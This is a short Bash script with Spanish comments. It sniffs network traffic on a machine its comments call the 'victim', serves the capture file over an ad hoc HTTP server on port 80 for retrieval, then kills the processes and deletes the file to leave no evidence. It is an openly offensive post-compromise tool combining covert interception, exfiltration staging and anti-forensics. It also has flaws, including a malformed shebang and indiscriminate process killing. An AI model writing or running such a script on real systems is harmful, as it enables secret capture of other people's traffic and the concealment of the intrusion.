#/bin/bash

#Creamos las variables
interfaz="eth0"
paquete="captura.pcap"
puerto_http="80"

#Con tcpdump capturamos el tráfico de la red y lo dejamos en segundo plano
tcpdump -i $interfaz -w $paquete &

#Dejamos un descanso de 5 segundos para evitar errores
sleep 5

#Levantamos un servidor en el puerto 80 y lo dejamos en segundo plano
python3 -m http.server $puerto_http &

#Ponemos una duración de 60 segundos para que sigan interceptando durante ese tiempo
sleep 60

#Creamos una variable para obtener el PID de los procesos que se abren con tcpdump y python
proceso_tcpdump=$(pgrep tcpdump)
proceso_python=$(pgrep python3)

#Paramos los procesos
kill $proceso_tcpdump
kill $proceso_python

echo "La captura se realizó correctamente y se envió el archivo '.pcap' por el servidor web"

#Borramos el archivo para no dejar pruebas en la máquina víctima 
rm $paquete
